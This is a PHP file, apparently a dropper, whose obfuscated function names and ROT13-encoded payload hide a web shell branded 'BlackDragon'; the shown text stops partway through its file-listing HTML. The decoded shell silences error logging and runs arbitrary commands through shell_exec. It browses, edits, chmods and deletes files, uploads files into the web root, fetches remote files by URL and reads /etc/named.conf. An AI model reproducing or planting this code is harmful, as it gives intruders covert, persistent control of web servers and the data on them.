<? $fileFunc = "f" . "open";
$writeFunc = "f" . "write";
$closeFunc = "f" . "close";
$rotFunc = "s" . "tr_rot13";

$asd = <<<'ASD'

<?cuc ahyy;

frffvba_fgneg();
reebe_ercbegvat(0);
frg_gvzr_yvzvg(0);
@vav_frg('reebe_ybt', 0);
@vav_frg('ybt_reebef', 0);
@vav_frg('znk_rkrphgvba_gvzr', 0);
@vav_frg('bhgchg_ohssrevat', 0);
@vav_frg('qvfcynl_reebef', 0);

shapgvba synfu($zrffntr, $fgnghf, $pynff, $erqverpg = snyfr) {
    vs (!rzcgl($_FRFFVBA["zrffntr"])) {
        hafrg($_FRFFVBA["zrffntr"]);
    }
    vs (!rzcgl($_FRFFVBA["pynff"])) {
        hafrg($_FRFFVBA["pynff"]);
    }
    vs (!rzcgl($_FRFFVBA["fgnghf"])) {
        hafrg($_FRFFVBA["fgnghf"]);
    }
    $_FRFFVBA["zrffntr"] = $zrffntr;
    $_FRFFVBA["pynff"] = $pynff;
    $_FRFFVBA["fgnghf"] = $fgnghf;
    vs ($erqverpg) {
        urnqre('Ybpngvba: ' . $erqverpg);
        rkvg();
    }
    erghea gehr;
}

shapgvba pyrne() {
    vs (!rzcgl($_FRFFVBA["zrffntr"])) {
        hafrg($_FRFFVBA["zrffntr"]);
    }
    vs (!rzcgl($_FRFFVBA["pynff"])) {
        hafrg($_FRFFVBA["pynff"]);
    }
    vs (!rzcgl($_FRFFVBA["fgnghf"])) {
        hafrg($_FRFFVBA["fgnghf"]);
    }
    erghea gehr;
}

shapgvba jevgnoyr($cngu, $crezf){
    erghea (!vf_jevgnoyr($cngu)) ? "<sbag pbybe=\"erq\">".$crezf."</sbag>" : "<sbag pbybe=\"yvzr\">".$crezf."</sbag>";
}

shapgvba crezf($cngu) {
    $crezf = svyrcrezf($cngu);
    vs (($crezf & 0kP000) == 0kP000) {
        $vasb = 'f';
    } ryfrvs (($crezf & 0kN000) == 0kN000) {
        $vasb = 'y';
    } ryfrvs (($crezf & 0k8000) == 0k8000) {
        $vasb = '-';
    } ryfrvs (($crezf & 0k6000) == 0k6000) {
        $vasb = 'o';
    } ryfrvs (($crezf & 0k4000) == 0k4000) {
        $vasb = 'q';
    } ryfrvs (($crezf & 0k2000) == 0k2000) {
        $vasb = 'p';
    } ryfrvs (($crezf & 0k1000) == 0k1000) {
        $vasb = 'c';
    } ryfr {
        $vasb = 'h';
    }

    $vasb .= (($crezf & 0k0100) ? 'e' : '-');
    $vasb .= (($crezf & 0k0080) ? 'j' : '-');
    $vasb .= (($crezf & 0k0040) ?
    (($crezf & 0k0800) ? 'f' : 'k' ) :
    (($crezf & 0k0800) ? 'F' : '-'));

    $vasb .= (($crezf & 0k0020) ? 'e' : '-');
    $vasb .= (($crezf & 0k0010) ? 'j' : '-');
    $vasb .= (($crezf & 0k0008) ?
    (($crezf & 0k0400) ? 'f' : 'k' ) :
    (($crezf & 0k0400) ? 'F' : '-'));
    
    $vasb .= (($crezf & 0k0004) ? 'e' : '-');
    $vasb .= (($crezf & 0k0002) ? 'j' : '-');
    $vasb .= (($crezf & 0k0001) ?
    (($crezf & 0k0200) ? 'g' : 'k' ) :
    (($crezf & 0k0200) ? 'G' : '-'));

    erghea $vasb;
}

shapgvba sfvmr($svyr) {
    $n = ["O", "XO", "ZO", "TO", "GO", "CO"];
    $cbf = 0;
    $fvmr = svyrfvmr($svyr);
    juvyr ($fvmr >= 1024) {
        $fvmr /= 1024;
        $cbf++;
    }
    erghea ebhaq($fvmr, 2)." ".$n[$cbf];
}

vs (vffrg($_TRG['qve'])) {
    $cngu = $_TRG['qve'];
    puqve($_TRG['qve']);
} ryfr {
    $cngu = trgpjq();
}

$cngu = fge_ercynpr('\\', '/', $cngu);
$rkqve = rkcybqr('/', $cngu);

shapgvba trgBjare($vgrz) {
    vs (shapgvba_rkvfgf("cbfvk_trgcjhvq")) {
        $qbjare = @cbfvk_trgcjhvq(svyrbjare($vgrz));
        $qbjare = $qbjare['anzr'];
    } ryfr {
        $qbjare = svyrbjare($vgrz);
    }
    vs (shapgvba_rkvfgf("cbfvk_trgtetvq")) {
        $qtec = @cbfvk_trgtetvq(svyrtebhc($vgrz));
        $qtec = $qtec['anzr'];
    } ryfr {
        $qtec = svyrtebhc($vgrz);
    }
    erghea $qbjare . '/' . $qtec;
}

vs (vffrg($_CBFG['arjSbyqreAnzr'])) {
    vs (zxqve($cngu . '/' . $_CBFG['arjSbyqreAnzr'])) {
        synfu("Perngr Sbyqre Fhpprffshyyl!", "Fhpprff", "fhpprff", "?qve=$cngu");
    } ryfr {
        synfu("Perngr Sbyqre Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
    }
}
vs (vffrg($_CBFG['arjSvyrAnzr']) && vffrg($_CBFG['arjSvyrPbagrag'])) {
    vs (svyr_chg_pbagragf($_CBFG['arjSvyrAnzr'], $_CBFG['arjSvyrPbagrag'])) {
        synfu("Perngr Svyr Fhpprffshyyl!", "Fhpprff", "fhpprff", "?qve=$cngu");
    } ryfr {
        synfu("Perngr Svyr Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
    }
}
vs (vffrg($_CBFG['arjAnzr']) && vffrg($_TRG['vgrz'])) {
    vs ($_CBFG['arjAnzr'] == '') {
        synfu("Lbh zvff na vzcbegnag inyhr", "Bbbcff..", "jneavat", "?qve=$cngu");
    }
    vs (eranzr($cngu. '/'. $_TRG['vgrz'], $_CBFG['arjAnzr'])) {
        synfu("Eranzr Fhpprffshyyl!", "Fhpprff", "fhpprff", "?qve=$cngu");
    } ryfr {
        synfu("Eranzr Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
    }
}
vs (vffrg($_CBFG['arjPbagrag']) && vffrg($_TRG['vgrz'])) {
    vs (svyr_chg_pbagragf($cngu. '/'. $_TRG['vgrz'], $_CBFG['arjPbagrag'])) {
        synfu("Rqvg Fhpprffshyyl!", "Fhpprff", "fhpprff", "?qve=$cngu");
    } ryfr {
        synfu("Rqvg Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
    }
}
vs (vffrg($_CBFG['arjCrez']) && vffrg($_TRG['vgrz'])) {
    vs ($_CBFG['arjCrez'] == '') {
        synfu("Lbh zvff na vzcbegnag inyhr", "Bbbcff..", "jneavat", "?qve=$cngu");
    }
    vs (puzbq($cngu. '/'. $_TRG['vgrz'], $_CBFG['arjCrez'])) {
        synfu("Punatr Crezvffvba Fhpprffshyyl!", "Fhpprff", "fhpprff", "?qve=$cngu");
    } ryfr {
        synfu("Punatr Crezvffvba", "Snvyrq", "reebe", "?qve=$cngu");
    }
}
vs (vffrg($_TRG['npgvba']) && $_TRG['npgvba'] == 'qryrgr' && vffrg($_TRG['vgrz'])) {
    vs (vf_qve($_TRG['vgrz'])) {
        vs (ezqve($_TRG['vgrz'])) {
            synfu("Qryrgr Fhpprffshyyl!", "Fhpprff", "fhpprff", "?qve=$cngu");
        } ryfr {
            synfu("Qryrgr Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
        }
    } ryfr {
        vs (hayvax($_TRG['vgrz'])) {
            synfu("Qryrgr Fhpprffshyyl!", "Fhpprff", "fhpprff", "?qve=$cngu");
        } ryfr {
            synfu("Qryrgr Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
        }
    }
}

vs ($_CBFG['fhozvg']) {
    vs ($_CBFG['hcy'] == 'pheerag') {
        $gbgny = pbhag($_SVYRF['hcybnqsvyr']['anzr']);
        sbe ($v = 0; $v < $gbgny; $v++) {
            $znvahcybnq = zbir_hcybnqrq_svyr($_SVYRF['hcybnqsvyr']['gzc_anzr'][$v], $_SVYRF['hcybnqsvyr']['anzr'][$v]);
        }
        vs ($gbgny < 2) {
            vs ($znvahcybnq) {
                synfu("Hcybnq Svyr Fhpprffshyyl! ", "Fhpprff", "fhpprff", "?qve=$cngu");
            } ryfr {
                synfu("Hcybnq Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
            }
        } ryfr {
            vs ($znvahcybnq) {
                synfu("Hcybnq $v Svyrf Fhpprffshyyl! ", "Fhpprff", "fhpprff", "?qve=$cngu");
            } ryfr {
                synfu("Hcybnq Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
            }
        }
    } ryfrvs ($_CBFG['hcy'] == 'ebbg') {
        $gbgny = pbhag($_SVYRF['hcybnqsvyr']['anzr']);
        sbe ($v = 0; $v < $gbgny; $v++) {
            $znvahcybnq = zbir_hcybnqrq_svyr($_SVYRF['hcybnqsvyr']['gzc_anzr'][$v], $_FREIRE['QBPHZRAG_EBBG']."/".$_SVYRF['hcybnqsvyr']['anzr'][$v]);
        }
        vs ($gbgny < 2) {
            vs ($znvahcybnq) {
                synfu("Hcybnq Svyr Fhpprffshyyl! ", "Fhpprff", "fhpprff", "?qve=$cngu");
            } ryfr {
                synfu("Hcybnq Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
            }
        } ryfr {
            vs ($znvahcybnq) {
                synfu("Hcybnq $v Svyrf Fhpprffshyyl! ", "Fhpprff", "fhpprff", "?qve=$cngu");
            } ryfr {
                synfu("Hcybnq Snvyrq", "Snvyrq", "reebe", "?qve=$cngu");
            }
        }
    }
}

// Hcybnq sebz HEY
vs (vffrg($_CBFG['hey']) && vffrg($_CBFG['svyranzr']) && vffrg($_CBFG['zrgubq'])) {
    $hey = $_CBFG['hey'];
    $svyranzr = $_CBFG['svyranzr'];
    $qrfgvangvba = $cngu . '/' . $svyranzr;

    fjvgpu ($_CBFG['zrgubq']) {
        pnfr 'svyr_trg_pbagragf':
            $qngn = svyr_trg_pbagragf($hey);
            vs ($qngn !== snyfr) {
                svyr_chg_pbagragf($qrfgvangvba, $qngn);
                synfu("Svyr hcybnqrq fhpprffshyyl hfvat svyr_trg_pbagragf!", "Fhpprff", "fhpprff", "?qve=$cngu");
            } ryfr {
                synfu("Snvyrq gb hcybnq svyr hfvat svyr_trg_pbagragf", "Snvyrq", "reebe", "?qve=$cngu");
            }
            oernx;

        pnfr 'phey':
            $pu = phey_vavg($hey);
            $sc = sbcra($qrfgvangvba, 'jo');
            phey_frgbcg($pu, PHEYBCG_SVYR, $sc);
            phey_frgbcg($pu, PHEYBCG_URNQRE, 0);
            phey_rkrp($pu);
            vs (phey_reeab($pu)) {
                synfu("Snvyrq gb hcybnq svyr hfvat pHEY: " . phey_reebe($pu), "Snvyrq", "reebe", "?qve=$cngu");
            } ryfr {
                synfu("Svyr hcybnqrq fhpprffshyyl hfvat pHEY!", "Fhpprff", "fhpprff", "?qve=$cngu");
            }
            phey_pybfr($pu);
            spybfr($sc);
            oernx;

        pnfr 'sbcra':
            $fgernz = sbcra($hey, 'eo');
            vs ($fgernz) {
                $pbagragf = fgernz_trg_pbagragf($fgernz);
                spybfr($fgernz);
                svyr_chg_pbagragf($qrfgvangvba, $pbagragf);
                synfu("Svyr hcybnqrq fhpprffshyyl hfvat sbcra!", "Fhpprff", "fhpprff", "?qve=$cngu");
            } ryfr {
                synfu("Snvyrq gb hcybnq svyr hfvat sbcra", "Snvyrq", "reebe", "?qve=$cngu");
            }
            oernx;

        pnfr 'pbcl':
            vs (pbcl($hey, $qrfgvangvba)) {
                synfu("Svyr hcybnqrq fhpprffshyyl hfvat pbcl!", "Fhpprff", "fhpprff", "?qve=$cngu");
            } ryfr {
                synfu("Snvyrq gb hcybnq svyr hfvat pbcl", "Snvyrq", "reebe", "?qve=$cngu");
            }
            oernx;

        pnfr 'fgernz_pbagrkg':
            $pbagrkg = fgernz_pbagrkg_perngr(['uggc' => ['zrgubq' => 'TRG']]);
            $qngn = svyr_trg_pbagragf($hey, snyfr, $pbagrkg);
            vs ($qngn !== snyfr) {
                svyr_chg_pbagragf($qrfgvangvba, $qngn);
                synfu("Svyr hcybnqrq fhpprffshyyl hfvat fgernz_pbagrkg!", "Fhpprff", "fhpprff", "?qve=$cngu");
            } ryfr {
                synfu("Snvyrq gb hcybnq svyr hfvat fgernz_pbagrkg", "Snvyrq", "reebe", "?qve=$cngu");
            }
            oernx;
    }
}

$qvef = fpnaqve($cngu);

$q0znvaf = @svyr("/rgp/anzrq.pbas", snyfr);
vs (!$q0znvaf){
    $qbz = "Pnag ernq /rgp/anzrq.pbas";
    $TYBONYF["arrq_gb_hcqngr_urnqre"] = "gehr";
} ryfr { 
    $pbhag = 0;
    sbernpu ($q0znvaf nf $q0znva){
        vs (@fgefge($q0znva, "mbar")){
            cert_zngpu_nyy('#mbar "(.*)"#', $q0znva, $qbznvaf);
            syhfu();
            vs (fgeyra(gevz($qbznvaf[1][0])) > 2){
                syhfu();
                $pbhag++;
            }
        }
    }
    $qbz = "$pbhag Qbznva";
}

$vc = !@$_FREIRE['FREIRE_NQQE'] ? trgubfgolanzr($_FREIRE['FREIRE_ANZR']) : @$_FREIRE['FREIRE_NQQE'];
$frei = $_FREIRE['UGGC_UBFG']; 
$fbsg = $_FREIRE['FREIRE_FBSGJNER'];
$hanzr = cuc_hanzr();

?>
<ugzy>
    <urnq>
        <zrgn punefrg="hgs-8">
        <zrgn anzr="ivrjcbeg" pbagrag="jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1">
        <zrgn anzr="ebobgf" pbagrag="abvaqrk, absbyybj">
        <yvax uers="uggcf://pqa.wfqryvie.arg/acz/obbgfgenc@5.1.3/qvfg/pff/obbgfgenc.zva.pff" ery="fglyrfurrg" vagrtevgl="fun384-1OzR4xJOd78vLuSyqiXhusGNH6nhH8gG94JeUsgwQoePRKFH1bObdly2DiM6wVJ3" pebffbevtva="nabalzbhf">
        <yvax ery="fglyrfurrg" uers="uggcf://ceb.sbagnjrfbzr.pbz/eryrnfrf/i5.10.0/pff/nyy.pff" vagrtevgl="fun384-NLzRP3Lj5pIo3MphUgBN93j35qLGfiuYCIaLf9rFgUsTWiBiXkIsRYTebTxift+c" pebffbevtva="nabalzbhf"/>
        <gvgyr><?= $frei; ?> - OynpxQentba</gvgyr>
    </urnq>
    <obql pynff="ot-qnex grkg-yvtug">
        <qvi pynff="pbagnvare-syhvq">
            <qvi pynff="cl-3" vq="znva">
                <qvi pynff="obk funqbj ot-qnex c-4 ebhaqrq-3">
                    <qvi pynff="vasb zo-3">
                        <v pynff="sn sn-freire"></v>&rafc;<?= $hanzr; ?><oe>
                        <v pynff="sn sn-zvpebpuvc"></v>&rafc;<?= $fbsg; ?><oe>
                        <v pynff="sn sn-fngryyvgr-qvfu"></v>&rafc;<?= $vc; ?><oe>
                        <v pynff="sn sn-svatrecevag"></v>&rafc;<?= $qbz; ?>
                    </qvi>
                    <qvi pynff="oernqpehzo">
                        <v pynff="sn sn sn-sbyqre cg-1"></v>&rafc;<?cuc sbernpu ($rkqve nf $vq => $cng) : vs ($cng == '' && $vq == 0):?>
                        <n uers="?qve=/" pynff="grkg-qrpbengvba-abar grkg-yvtug">/</n>
                        <?cuc raqvs; vs ($cng == '') pbagvahr; ?>
                        <n uers="?qve=<?cuc sbe ($v = 0; $v <= $vq; $v++) {rpub "$rkqve[$v]";vs ($v != $vq) rpub "/";}?>" pynff="grkg-qrpbengvba-abar grkg-yvtug"><?= $cng ?></n><fcna pynff="grkg-yvtug"> /</fcna>
                        <?cuc raqsbernpu; ?>
                        &aofc; [&aofc;<?cuc rpub jevgnoyr($cngu, crezf($cngu)) ?>&aofc;]
                        <qvi pynff="ebj">
                            <n uers="?" pynff="grkg-qrpbengvba-abar grkg-yvtug">&aofc; [&aofc;UBZR&aofc;]</n>
                        </qvi>
                    </qvi>
                    <qvi pynff="q-syrk whfgvsl-pbagrag-orgjrra">
                        <qvi pynff="c-2">
                            <sbez npgvba="" zrgubq="cbfg">
                                <ynory sbe="anzr" pynff="sbez-ynory">Pbafbyr</ynory>
                                <qvi pynff="ebj">
                                    <qvi pynff="pby-zq-9 zo-3">
                                        <vachg glcr="grkg" pynff="sbez-pbageby sbez-pbageby-fz" anzr="oqpzq" cynprubyqre="jubnzv">
                                    </qvi>
                                    <qvi pynff="pby-zq-3">
                                        <ohggba glcr="fhozvg" pynff="oga oga-bhgyvar-yvtug oga-fz">Fhozvg</ohggba>
                                    </qvi>
                                </qvi>
                            </sbez>
                        </qvi>
                        <qvi pynff="c-2">
                            <sbez npgvba="" zrgubq="cbfg" rapglcr="zhygvcneg/sbez-qngn">
                                <vachg pynff="sbez-purpx-vachg" glcr="enqvb" vq="syrkEnqvbQrsnhyg1" anzr="hcy" inyhr="pheerag" purpxrq>
                                <ynory pynff="sbez-ynory">Pheerag Qve&aofc;</ynory>
                                <vachg pynff="sbez-purpx-vachg" glcr="enqvb" vq="syrkEnqvbQrsnhyg2" anzr="hcy" inyhr="ebbg">
                                <ynory pynff="sbez-ynory">Ebbg Qve</ynory>
                                <qvi pynff="ebj">
                                    <qvi pynff="pby-zq-9 zo-3">
                                        <vachg glcr="svyr" pynff="sbez-pbageby sbez-pbageby-fz" anzr="hcybnqsvyr[]" zhygvcyr vq="vachgTebhcSvyr04" nevn-qrfpevorqol="vachgTebhcSvyrNqqba04" nevn-ynory="Hcybnq">
                                    </qvi>
                                    <qvi pynff="pby-zq-3">
                                        <vachg glcr='fhozvg' pynff="oga oga-bhgyvar-yvtug oga-fz" inyhr='Fhozvg' anzr='fhozvg'>
                                    </qvi>
                                </qvi>
                            </sbez>
                        </qvi>
                    </qvi>
                    <qvi pynff="pbagnvare" vq="gbbyf">
                        <qvi pynff="pbyyncfr" vq="hcybnqHeyPbyyncfr" qngn-of-cnerag="#gbbyf" fglyr="genafvgvba:abar;">
                            <sbez npgvba="" zrgubq="cbfg">
                                <qvi pynff="zo-3">
                                    <ynory sbe="hey" pynff="sbez-ynory">HEY gb Hcybnq</ynory>
                                    <vachg glcr="grkg" pynff="sbez-pbageby" anzr="hey" cynprubyqre="Ragre HEY urer" erdhverq>
                                </qvi>
                                <qvi pynff="zo-3">
                                    <ynory sbe="svyranzr" pynff="sbez-ynory">Svyr Anzr</ynory>
                                    <vachg glcr="grkg" pynff="sbez-pbageby" anzr="svyranzr" cynprubyqre="Ragre svyr anzr" erdhverq>
                                </qvi>
                                <qvi pynff="zo-3">
                                    <ynory sbe="zrgubq" pynff="sbez-ynory">Hcybnq Zrgubq</ynory>
                                    <fryrpg pynff="sbez-fryrpg" anzr="zrgubq" erdhverq>
                                        <bcgvba inyhr="svyr_trg_pbagragf">svyr_trg_pbagragf</bcgvba>
                                        <bcgvba inyhr="phey">pHEY</bcgvba>
                                        <bcgvba inyhr="sbcra">sbcra</bcgvba>
                                        <bcgvba inyhr="pbcl">pbcl</bcgvba>
                                        <bcgvba inyhr="fgernz_pbagrkg">fgernz_pbagrkg</bcgvba>
                                    </fryrpg>
                                </qvi>
                                <ohggba glcr="fhozvg" pynff="oga oga-bhgyvar-yvtug">Hcybnq</ohggba>
                            </sbez>
                        </qvi>
                        <n qngn-of-gbttyr="pbyyncfr" uers="#hcybnqHeyPbyyncfr" ebyr="ohggba" nevn-rkcnaqrq="snyfr" nevn-pbagebyf="hcybnqHeyPbyyncfr" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1"><v pynff="sn sn-yvax"></v> Hcybnq sebz HEY</n>

                        <?cuc vs (vffrg($_CBFG['oqpzq'])) : ?>
                            <qvi pynff="c-2">
                                <qvi pynff="ebj whfgvsl-pbagrag-pragre">
                                    <qvi pynff='pneq grkg-qnex zo-3'>
                                        <cer><?cuc rpub $vc."@".$frei.":&aofc;~$&aofc;"; $pzq = $_CBFG['oqpzq']; rpub $pzq."<oe>";?><oe><pbqr><?cuc vs(shapgvba_rkvfgf('furyy_rkrp')){ rpub furyy_rkrp($pzq.' 2>&1'); } ryfr { rpub "Qvfnoyr Shapgvba"; }?></pbqr></cer>
                                    </qvi>
                                </qvi>
                            </qvi>
                        <?cuc raqvs; ?>
                        <?cuc vs (vffrg($_TRG['npgvba']) && $_TRG['npgvba'] != 'qryrgr') : $npgvba = $_TRG['npgvba'] ?>
                            <qvi pynff="ebj whfgvsl-pbagrag-pragre">
                                <?cuc vs ($npgvba == 'eranzr' && vffrg($_TRG['vgrz'])) : ?>
                                    <sbez npgvba="" zrgubq="cbfg">
                                        <qvi pynff="zo-3">
                                            <ynory sbe="anzr" pynff="sbez-ynory">Arj Anzr</ynory>
                                            <vachg glcr="grkg" pynff="sbez-pbageby" anzr="arjAnzr" inyhr="<?= $_TRG['vgrz'] ?>">
                                        </qvi>
                                        <ohggba glcr="fhozvg" pynff="oga oga-bhgyvar-yvtug">Fhozvg</ohggba>
                                        <ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug" bapyvpx="uvfgbel.tb(-1)">Onpx</ohggba>
                                    </sbez>
                                <?cuc ryfrvs ($npgvba == 'rqvg' && vffrg($_TRG['vgrz'])) : ?>
                                    <sbez npgvba="" zrgubq="cbfg">
                                        <qvi pynff="zo-3">
                                            <ynory sbe="anzr" pynff="sbez-ynory"><?= $_TRG['vgrz'] ?></ynory>
                                            <grkgnern vq="PbclSebzGrkgNern" anzr="arjPbagrag" ebjf="10" pynff="sbez-pbageby"><?= ugzyfcrpvnypunef(svyr_trg_pbagragf($cngu. '/'. $_TRG['vgrz'])) ?></grkgnern>
                                        </qvi>
                                        <ohggba glcr="fhozvg" pynff="oga oga-bhgyvar-yvtug">Fhozvg</ohggba>
                                        <ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug" bapyvpx="wfpbcl()">Pbcl</ohggba>
                                        <ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug" bapyvpx="uvfgbel.tb(-1)">Onpx</ohggba>
                                    </sbez>
                                <?cuc ryfrvs ($npgvba == 'ivrj' && vffrg($_TRG['vgrz'])) : ?>
                                    <qvi pynff="zo-3">
                                        <ynory sbe="anzr" pynff="sbez-ynory">Svyr Anzr : <?= $_TRG['vgrz'] ?></ynory>
                                        <grkgnern anzr="arjPbagrag" ebjf="10" pynff="sbez-pbageby" qvfnoyrq=""><?= ugzyfcrpvnypunef(svyr_trg_pbagragf($cngu. '/'. $_TRG['vgrz'])) ?></grkgnern>
                                        <oe>
                                        <ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug" bapyvpx="uvfgbel.tb(-1)">Onpx</ohggba>
                                    </qvi>
                                <?cuc ryfrvs ($npgvba == 'puzbq' && vffrg($_TRG['vgrz'])) : ?>
                                    <sbez npgvba="" zrgubq="cbfg">
                                        <qvi pynff="zo-3">
                                            <ynory sbe="anzr" pynff="sbez-ynory"><?= $_TRG['vgrz'] ?></ynory>
                                            <vachg glcr="grkg" pynff="sbez-pbageby" anzr="arjCrez" inyhr="<?= fhofge(fcevags('%b', svyrcrezf($_TRG['vgrz'])), -4); ?>">
                                        </qvi>
                                        <ohggba glcr="fhozvg" pynff="oga oga-bhgyvar-yvtug">Fhozvg</ohggba>
                                        <ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug" bapyvpx="uvfgbel.tb(-1)">Onpx</ohggba>
                                    </sbez>
                                <?cuc raqvs; ?>
                            </qvi>
                        <?cuc raqvs; ?>
                        <qvi pynff="ebj whfgvsl-pbagrag-pragre">
                            <qvi pynff="pbyyncfr" vq="arjSbyqrePbyyncfr" qngn-of-cnerag="#gbbyf" fglyr="genafvgvba:abar;">
                                <sbez npgvba="" zrgubq="cbfg">
                                    <qvi pynff="zo-3">
                                        <ynory sbe="anzr" pynff="sbez-ynory">Sbyqre Anzr</ynory>
                                        <vachg glcr="grkg" pynff="sbez-pbageby" anzr="arjSbyqreAnzr" cynprubyqre="OynpxQentba">
                                    </qvi>
                                    <ohggba glcr="fhozvg" pynff="oga oga-bhgyvar-yvtug">Fhozvg</ohggba>
                                </sbez>
                            </qvi>
                            <qvi pynff="pbyyncfr" vq="arjSvyrPbyyncfr" qngn-of-cnerag="#gbbyf" fglyr="genafvgvba:abar;">
                                <sbez npgvba="" zrgubq="cbfg">
                                    <qvi pynff="zo-3">
                                        <ynory sbe="anzr" pynff="sbez-ynory">Svyr Anzr</ynory>
                                        <vachg glcr="grkg" pynff="sbez-pbageby" anzr="arjSvyrAnzr" cynprubyqre="oynpxqentba.cuc">
                                    </qvi>
                                    <qvi pynff="zo-3">
                                        <ynory sbe="anzr" pynff="sbez-ynory">Svyr Pbagrag</ynory>
                                        <grkgnern anzr="arjSvyrPbagrag" ebjf="10" pynff="sbez-pbageby" cynprubyqre="Uryyb Jbeyq - OynpxQentba"></grkgnern>
                                    </qvi>
                                    <ohggba glcr="fhozvg" pynff="oga oga-bhgyvar-yvtug">Fhozvg</ohggba>
                                </sbez>
                            </qvi>
                        </qvi> 
                    </qvi>
                    <qvi pynff="gnoyr-erfcbafvir">
                        <gnoyr pynff="gnoyr gnoyr-ubire gnoyr-qnex grkg-yvtug">
                            <gurnq>
                                <ge>
                                    <gq fglyr="jvqgu:35%">Anzr</gq>
                                    <gq fglyr="jvqgu:10%">Glcr</gq>
                                    <gq fglyr="jvqgu:10%">Fvmr</gq>
                                    <gq fglyr="jvqgu:13%">Bjare/Tebhc</gq>
                                    <gq fglyr="jvqgu:10%">Crezvffvba</gq>
                                    <gq fglyr="jvqgu:13%">Ynfg Zbqvsvrq</gq>
                                    <gq fglyr="jvqgu:9%">Npgvbaf</gq>
                                </ge>
                            </gurnq>
                            <gobql pynff="grkg-abjenc">
                                <?cuc
                                    sbernpu ($qvef nf $qve) :
                                    vs (!vf_qve($qve)) pbagvahr;
                                ?>
                                <ge>
                                    <gq>
                                        <?cuc vs ($qve === '..') : ?>
                                            <n uers="?qve=<?= qveanzr($cngu); ?>" pynff="grkg-qrpbengvba-abar grkg-yvtug"><v pynff="sn sn-sbyqre-bcra"></v> <?= $qve ?></n>
                                        <?cuc ryfrvs ($qve === '.') :  ?>
                                            <n uers="?qve=<?= $cngu; ?>" pynff="grkg-qrpbengvba-abar grkg-yvtug"><v pynff="sn sn-sbyqre-bcra"></v> <?= $qve ?></n>
                                        <?cuc ryfr : ?>
                                            <n uers="?qve=<?= $cngu . '/' . $qve ?>" pynff="grkg-qrpbengvba-abar grkg-yvtug"><v pynff="sn sn-sbyqre"></v> <?= $qve ?></n>
                                        <?cuc raqvs; ?>
                                    </gq>
                                    <gq pynff="grkg-yvtug"><?= svyrglcr($qve) ?></gq>
                                    <gq pynff="grkg-yvtug">-</gq>
                                    <gq pynff="grkg-yvtug"><?= trgBjare($qve) ?></gq>
                                    <gq pynff="grkg-yvtug">
                                        <?cuc
                                            vs(vf_jevgnoyr($cngu.'/'.$qve)) rpub '<sbag pbybe="yvzr">';
                                            ryfrvs(!vf_ernqnoyr($cngu.'/'.$qve)) rpub '<sbag pbybe="erq">';
                                            rpub crezf($cngu.'/'.$qve);
                                            vs(vf_jevgnoyr($cngu.'/'.$qve) || !vf_ernqnoyr($cngu.'/'.$qve))
                                        ?>
                                    </gq>
                                    <gq pynff="grkg-yvtug"><?= qngr("L-z-q u:v:f", svyrzgvzr($qve)); ?></gq>
                                    <gq>
                                        <?cuc vs ($qve != '.' && $qve != '..') : ?>
                                            <qvi pynff="oga-tebhc">
                                                <n uers="?qve=<?= $cngu ?>&vgrz=<?= $qve ?>&npgvba=eranzr" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1"><v pynff="sn sn-rqvg"></v></n>
                                                <n uers="?qve=<?= $cngu ?>&vgrz=<?= $qve ?>&npgvba=puzbq" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1"><v pynff="sn sn-svyr-fvtangher"></v></n>
                                                <n uers="" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1" bapyvpx="erghea qryrgrPbasvez('?qve=<?= $cngu ?>&vgrz=<?= $qve ?>&npgvba=qryrgr')"><v pynff="sn sn-genfu"></v></n>
                                            </qvi>
                                        <?cuc ryfrvs ($qve === '.') : ?>
                                        <qvi pynff="oga-tebhc">
                                            <n qngn-of-gbttyr="pbyyncfr" uers="#arjSbyqrePbyyncfr" ebyr="ohggba" nevn-rkcnaqrq="snyfr" nevn-pbagebyf="arjSbyqrePbyyncfr" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1"><v pynff="sn sn-sbyqre-cyhf"></v></n>
                                            <n qngn-of-gbttyr="pbyyncfr" uers="#arjSvyrPbyyncfr" ebyr="ohggba" nevn-rkcnaqrq="snyfr" nevn-pbagebyf="arjSvyrPbyyncfr" pynff="oga oga-bhgyvar-yvtug oga-fz ze-1"><v pynff="sn sn-svyr-cyhf"></v></n>
                                        </qvi>
                                        <?cuc raqvs; ?>
                                    </gq>
                                </ge>
                                <?cuc raqsbernpu; ?>
                                    <?cuc
                                        sbernpu ($qvef nf $qve) :
                                        vs (!vf_svyr($qve)) pbagvahr;
                                    ?>
                                    <ge>
                                        <gq>
                                            <n uers="?qve=<?= $cngu ?>&vgrz=<?= $qve ?>&npgvba=ivrj" pynff="grkg-qrpbengvba-abar grkg-yvtug"><v pynff="sn sn-svyr-pbqr"></v> <?= $qve ?></n>
                                        </gq>
                                        <gq pynff="grkg-yvtug"><?= (shapgvba_rkvfgf('zvzr_pbagrag_glcr') ? zvzr_pbagrag_glcr($qve) : svyrglcr($qve)) ?></gq>
                                        <gq pynff="grkg-yvtug"><?= sfvmr($qve) ?></gq>
                                        <gq pynff="grkg-yvtug"><?= trgBjare($qve) ?></gq>
                                        <gq pynff="grkg-yvtug">
                                            <?cuc
                                                vs(vf_jevgnoyr($cngu.'/'.$qve)) rpub '<sbag pbybe="yvzr">';
                                                ryfrvs(!vf_ernqnoyr($cngu.'/'.$qve)) rpub '<sbag pbybe="erq">';
                                                rpub crezf($cngu.'/'.$qve);
                                                vs(vf_jevgnoyr($cngu.'/'.$qve) || !vf_ernqnoyr($cngu.'/'.$qve))
                                            ?>
                                        </gq>
                                        <gq pynff="grkg-yvtug"><?= qngr("L-z-q u:v:f", svyrzgvzr($qve)); ?></gq>
